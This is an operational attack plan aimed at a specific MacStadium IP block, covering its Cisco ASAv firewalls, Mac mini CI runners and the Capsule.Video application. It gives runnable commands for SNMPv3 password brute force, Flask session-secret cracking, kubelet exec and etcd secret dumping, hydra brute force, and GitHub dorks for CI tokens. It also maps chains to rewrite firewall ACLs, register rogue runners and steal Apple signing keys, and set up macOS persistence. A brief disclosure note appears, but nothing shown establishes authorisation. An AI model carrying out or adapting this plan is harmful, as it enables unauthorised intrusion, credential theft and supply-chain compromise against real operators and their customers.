# Attack Plan — MacStadium 207.254.47.x Block

**Date:** 2026-08-11  
**Author:** VDT  
**Status:** ACTIVE — enumeration phase complete, attack path analysis finalized

---

## Situation Summary

11 Apple Silicon Mac mini CI runners (.194-.243), plus 4 Cisco ASAv management hosts (.17, .25, .65, .81), plus Capsule.Video at .155.

**Core blocker:** Cisco ASAv IP-based access control. Our source IP (37.120.147.156, M247 Las Vegas) is not in the ASAv's `http <ip> <mask>` or `ssh <ip> <mask>` ACLs. The ASAv completes TCP 3-way handshake on :443 but RSTs after receiving TLS ClientHello — classic Cisco HTTPS management IP-gate behavior. WebVPN/AnyConnect is NOT configured on the outside interface (if it were, the ASAv would complete TLS and serve the login portal for any source IP).

**Accessible from our IP:**

| Host | Port | Service | Auth | Notes |
|------|------|---------|------|-------|
| 207.254.47.155 | :80/:443 | Capsule.Video (Flutter SPA) | Google OAuth | HTTPS accessible |
| 207.254.47.155 | :5010 | Capsule Cloud API v2.4.90 | Bearer token | HTTP (plaintext) |
| 207.254.47.155 | :8181 | Hypnode (same app) | Google OAuth | |
| .17, .25, .65, .81 | :161 | SNMP v3 | Username+auth | `admin` = valid user (diff response) |
| .17, .25, .65, .81 | :443 | HTTPS | IP-filtered | RST after ClientHello |
| .17, .25, .65, .81 | :80 | HTTP | IP-filtered | Connection accepted, drops payload |
| .194-.243 | :22 | OpenSSH 10.2 | pubkey only | No password auth |
| .194-.243 | :5900 | VNC | IP-filtered | Open to Shodan, not us |

---

## Attack Paths — Ranked by Viability

---

### PATH 1: Capsule.Video OAuth / API Bypass (HIGHEST PRIORITY)

**Surface:** 207.254.47.155 — Flask backend + Flutter SPA + RQ workers

**What we know:**
- Server: `Capsule Cloud/2.4.90,1.8.9` (Python/Flask)
- API port :5010 serves HTTP (no TLS)
- Auth mechanism: Google OAuth → session token `admin_session_token` stored in browser sessionStorage
- Flutter bundle at `/admin/public/main.dart.js` (~2.7MB) — all API routes extracted
- Confirmed endpoints: `/admin/auth/google`, `/admin/auth/logout`, `/admin/auth/session`, `/admin/api/media/`, `/admin/api/files`, `/cluster/system`, `/rq/pending`, `/rq/running`
- `/admin/` on :5010 → 401 (requires `admin_session_token`)
- `/` on :5010 → 200 (version page, no auth)

**Attack vectors:**

**1a. Google OAuth state/redirect_uri misconfiguration**
- `GET https://207.254.47.155/admin/auth/google` — observe the redirect URL sent to Google
- Google OAuth sends: `https://accounts.google.com/o/oauth2/auth?redirect_uri=<callback>&state=<random>`
- If `redirect_uri` is not pinned to a specific URI → open redirect → intercept code
- If `state` is predictable/reusable → CSRF on the OAuth flow
- If the callback at `/admin/auth/google/callback` doesn't validate `state` → CSRF → create session as attacker-controlled Google account
- **Execute:** `curl -v -L https://207.254.47.155/admin/auth/google 2>&1` — capture the redirect chain, look at `state` parameter and `redirect_uri`

**1b. Flask session secret brute force**
- Flask sessions are signed JWTs using `app.secret_key`
- If the secret is weak (env variable like `SECRET_KEY=development`, `flask-secret`, `capsule`, etc.) → forge admin session cookie
- Tool: `flask-unsign` → `flask-unsign --decode --cookie "<session_cookie>"` then `flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --cookie "<session_cookie>"`
- Collect a session cookie from any request to `/admin/` (even the 401 response may set a cookie)

**1c. RQ job queue inspection (unauthenticated path)**
- `/rq/pending` and `/rq/running` returned 501 on :5010 — try :443 (the main HTTPS port) and :8181 (hypnode)
- RQ (Redis Queue) dashboard often exposed at `/rq/` with no auth in development configs
- If accessible → can enqueue arbitrary jobs → potential for server-side code execution via worker

**1d. Google domain restriction bypass**
- Determine what Google domains are allowed (likely `@capsule.video` or `@macstadium.com`)
- If domain restriction is not enforced in the callback handler → any Google account can authenticate
- Test: complete OAuth flow with a Gmail account — does the server accept `@gmail.com`?

**1e. Session token in HTTP traffic**
- API at :5010 is HTTP (no TLS)
- If any internal process (CI runner, Capsule.Video internal service) hits the API over HTTP → token in plaintext on the LAN
- Not exploitable from our IP directly, but relevant if we get internal pivot

**Execute order:**
```
# Step 1: Trace the OAuth redirect chain
curl -v -L --max-redirs 5 https://207.254.47.155/admin/auth/google 2>&1

# Step 2: Get any session cookie from the app
curl -c /tmp/capsule_cookies.txt https://207.254.47.155/admin/ -v 2>&1 | head -30

# Step 3: Try flask-unsign if a cookie is present
pip install flask-unsign flask-unsign-wordlist 2>/dev/null
flask-unsign --decode --cookie "<cookie_value>"
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie "<cookie_value>"

# Step 4: Test domain restriction with a Google account OAuth flow manually
# Open browser → https://207.254.47.155/admin/auth/google → complete with @gmail.com account

# Step 5: Check /rq/ dashboard on :8181
curl -sk https://207.254.47.155:8181/rq/ -o /dev/null -w "%{http_code}"
curl -sk https://207.254.47.155:8181/rq/pending -o /dev/null -w "%{http_code}"
```

---

### PATH 2: SNMP v3 `admin` User Attack

**Surface:** 207.254.47.17 (confirmed Cisco device — Engine ID `00:ea:bd:20:3a:f8`)

**What we know:**
- SNMP v3 Engine ID retrieved in prior session
- All tested usernames produce "Unknown user name" immediately
- `admin` produces no output (timeout/different error handling) — valid username indicator
- v1/v2c with `public` → timeout (community-based SNMP likely disabled)

**Theory:** Cisco ASA SNMP v3 with `admin` user configured (`snmp-server user admin <group> v3 auth sha <password> priv aes <key>`). The "no output" response from `admin` vs "Unknown user name" from all others indicates the engine processes `admin` differently — it exists but requires proper auth credentials.

**Attack vectors:**

**2a. SNMP v3 password brute force on `admin`**
```bash
# Try common Cisco SNMP v3 passwords
for pass in "cisco" "cisco123" "C1sco12345" "Admin1234" "macstadium" "MacStadium1" "admin" "Admin123" "Cisco123"; do
  result=$(timeout 3 snmpwalk -v 3 -u admin -l authPriv -a SHA -A "$pass" -x AES -X "$pass" -t 2 207.254.47.17 .1.3.6.1.2.1.1.1.0 2>&1 | head -1)
  echo "$pass: $result"
done
```

**2b. Read SNMP config if auth succeeds**

If valid credentials found:
```bash
# sysDescr — confirms ASA version
snmpwalk -v 3 -u admin -l authPriv -a SHA -A <pass> -x AES -X <pass> 207.254.47.17 .1.3.6.1.2.1.1 

# ifDescr + ifAdminStatus — enumerate interfaces
snmpwalk -v 3 -u admin -l authPriv -a SHA -A <pass> -x AES -X <pass> 207.254.47.17 .1.3.6.1.2.1.2.2.1

# Cisco specific — running config via SNMP (Cisco SNMP MIB write to retrieve config via TFTP)
# OID: 1.3.6.1.4.1.9.2.1.55 (ccCopySourceFileType) — ASA config backup
# Set up TFTP server → trigger SNMP-based config dump → read running-config
```

**2c. SNMP write community → modify ACL**

If write credentials exist:
- SNMP SET to add our IP to the management ACL → unlocks ASDM + SSH
- OID: `1.3.6.1.4.1.9.9.91.1.1.1.1.3` (Cisco ACL extension — limited)
- More practical: SNMP trigger config copy to TFTP, modify, reload via TFTP push

---

### PATH 3: Post-Capsule Pivot (Conditional on PATH 1)

**If Capsule.Video admin access is obtained**, .155 is inside the MacStadium network segment. From there:

**3a. Enumerate management surfaces (now reachable from inside)**
```bash
# From .155's perspective, ASAv inside ACL likely permits .155 → management
# kubelet unauthenticated exec
curl http://207.254.47.194:10250/pods 2>/dev/null
curl http://207.254.47.194:10250/exec/<namespace>/<pod>/<container> -XPOST

# etcd secret dump
etcdctl --endpoints=http://207.254.47.17:2379 get /registry/secrets --prefix | strings

# K8s API server (likely on .1 or .17 gateway)
curl http://207.254.47.17:6443/api/v1/namespaces/default/secrets

# NATS monitoring
curl http://207.254.47.17:8222/varz
curl http://207.254.47.17:8222/jsz
```

**3b. Capsule.Video → RQ worker execution**

If RQ workers process user-controlled input (video uploads, URLs):
- Submit a crafted request that triggers SSRF or command execution in the worker
- Workers likely run as the same user as the Flask app (not root, but LAN-reachable)
- Look for ffmpeg processing (video) → ffmpeg SSRF via malicious video file with embedded URLs

**3c. VNC to Mac minis (from inside)**
```bash
# VNC :5900 open on Mac minis — Apple Remote Desktop
# From inside: source IP matches ASAv inside ACL → connection permitted
nc -zv 207.254.47.194 5900
# Auth: requires macOS local account credentials
# Default macOS ARD password: try blank, "apple", "admin", "root"
# ARD-specific: try kick via UDP :3283 first
```

**3d. ASAv blank enable password (from inside via ASDM)**
```bash
# ASDM accessible from inside the network
https://207.254.47.17/admin/public/index.html
# Username: <empty or "enable" if configured>
# Enable password: <blank — press Enter>
# Once in ASDM: add our IP (37.120.147.156) to http ACL:
#   Configuration > Device Management > Management Access > ASDM/HTTPS/Telnet/SSH > Add
# This unlocks full ASDM from our external IP
```

---

### PATH 4: SSH Key Material via GitHub Dork

**MacStadium customers** expose Apple Silicon CI runners and often commit runner configs to public repos.

**Dorks:**
```
# GitHub search for macstadium SSH keys
site:github.com "macstadium.com" filetype:yml
site:github.com "207.254.47" ssh
site:github.com "orka" "macstadium" secret

# GitHub Actions workflows targeting MacStadium
"runs-on: macstadium" OR "runs-on: self-hosted" AND "macos-arm"

# fastlane match S3 bucket references
"match_s3_bucket" "MATCH_PASSWORD" filetype:env
```

**Value:** CI runner tokens (`BUILDKITE_AGENT_TOKEN`, `GITHUB_TOKEN` with runner registration scope) would allow registering a rogue runner that receives jobs containing macOS signing credentials.

---

### PATH 5: ASAv CVE-2023-20269 (Conditional on WebVPN Enablement)

**CVE-2023-20269** (CVSS 9.1) — Cisco ASA/FTD VPN username enumeration and brute force without auth. Requires `webvpn enable <interface>` or AnyConnect SSL VPN configured.

**Current status:** WebVPN NOT enabled on outside interface (.17/.25/.65/.81 all RST after ClientHello — confirmed). However:
- MacStadium may have a separate VPN termination host not yet identified
- Scan broader range for :443 with VPN-specific paths

**Verification:**
```bash
# Scan broader MacStadium block for WebVPN-enabled ASAs
nmap -p 443 207.254.47.0/24 --open 2>/dev/null
# For any new 443 open hosts — check for WebVPN
curl -sk "https://<ip>/+webvpn+/" -o /dev/null -w "%{http_code}"
curl -sk "https://<ip>/+CSCOE+/logon.html" -o /dev/null -w "%{http_code}"
```

**If WebVPN found:**
```bash
# CVE-2023-20269 — enumerate valid usernames via error timing
# Username valid → "Invalid Credentials" (different from "No such user")
# Then brute force: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt sslvpn://207.254.47.x
```

---

## Execution Priority

| Priority | Path | Action | Expected Yield |
|---|---|---|---|
| **P0** | PATH 1a | Trace OAuth redirect chain, check redirect_uri | WebVPN-equivalent auth bypass |
| **P0** | PATH 1b | Flask-unsign on session cookie | Full admin access if weak secret |
| **P0** | PATH 1d | Test Gmail account on OAuth flow | Determines if domain restriction exists |
| **P1** | PATH 2a | SNMP v3 brute on `admin` user | ASA running-config + ACL modification |
| **P1** | PATH 1c | RQ dashboard enumeration on :8181 | Unauthenticated job queue access |
| **P2** | PATH 4 | GitHub dork for MacStadium CI configs | Runner token harvest |
| **P3** | PATH 5 | Scan for WebVPN on broader block | CVE-2023-20269 |
| **P4** | PATH 3 | Conditional on Capsule.Video access | Internal pivot to Mac minis |

---

## Post-Auth Chains (After Any of the Above)

### Chain A: Capsule.Video admin → Orka K8s → Mac mini

```
[Capsule.Video RCE/admin]
  → pivot to internal network (.17 range)
  → kubelet :10250 unauth exec → pod exec in Orka namespace
  → Orka pod → macOS VM escape (multi-tenant namespace break)
  → macOS Keychain: signing certs + App Store Connect .p8 keys
  → macOS persistence: LaunchAgent + APFS snapshot preservation
```

### Chain B: SNMP write → ASAv config → ACL open → All surfaces

```
[SNMP admin write access]
  → TFTP config pull → modify http ACL → push back → ASAv reload
  → ASDM accessible from external IP
  → Add our IP → ASDM blank enable password → full firewall control
  → VNC :5900 unfiltered → Mac mini ARD access (need local creds)
  → SSH :22 accessible → pubkey required
  → etcd :2379 direct access → dump all K8s secrets
```

### Chain C: Runner token → GitHub Actions runner → macOS signing

```
[GitHub dork: BUILDKITE_AGENT_TOKEN or GITHUB_TOKEN w/runner scope]
  → Register rogue MacStadium-compatible runner
  → Next CI job dispatched → receive job environment
  → env contains: Apple Developer cert password, S3 match keys
  → Export signing identity → sign arbitrary binaries
```

---

## Intelligence Gaps (Need Before Next Execution)

1. **Capsule.Video OAuth callback URL** — what Google OAuth redirect_uri is registered? Is it pinned to `capsule.video` domain or to the IP? Determines feasibility of 1a.
2. **RQ dashboard location** — is it at :8181/rq/, :443/rq/, or internal-only?
3. **ASAv management IP range** — what source IPs does the `http <ip>` ACL allow? (Find via SNMP if auth succeeds, or guess from known MacStadium IP ranges)
4. **Capsule.Video Google OAuth domain restriction** — does it actually check email domain in the callback handler?
5. **Broader .0/24 scan for WebVPN** — scan all 207.254.47.x for :443 open with WebVPN paths

---

## ASAv Technical Context (Books Intel)

**Default credentials:**
- Enable password: **blank** (press Enter) — confirmed in ASA All-in-One ch04 AND Cisco Firewalls (Moraes) ch03
- No default username for SSH (requires AAA config post-8.4.2)
- No default Telnet password post-9.0.2
- ASDM URL: `https://<ip>/admin/public/index.html`

**Password recovery (physical access required):**
- ROMMON → `confreg` → disable system configuration → boot without config → set new password
- `no service password-recovery` can block this (wipes flash instead — destructive)

**SNMP write → config dump:**
```
# Trigger running-config copy to TFTP via SNMP SET
# OID: cisco.ciscoMgmt.ccCopy.ccCopyTable.ccCopyEntry (CISCO-CONFIG-COPY-MIB)
# Practical: set up TFTP server, trigger copy, intercept config
snmpset -v 3 -u admin -l authPriv ... <oid> i <value>
```

**After obtaining running-config:**
- `show running-config | grep http` → exposes allowed IP ranges
- `show running-config | grep enable password` → encrypted (type 7 or type 9)
- Type 7 passwords → reversible (john or online tools)
- Type 9 (scrypt) → not reversible but can test blank enable via ASDM

---

## Disclosure Context

MacStadium contact: ktran@macstadium.com  
Findings V1-V3 (SSH config) already documented in VULNERABILITIES file.  
Capsule.Video: capsule.video — separate disclosure if auth bypass found.

---

**Next execution:** Start with PATH 1 — Capsule.Video OAuth trace and flask-unsign.
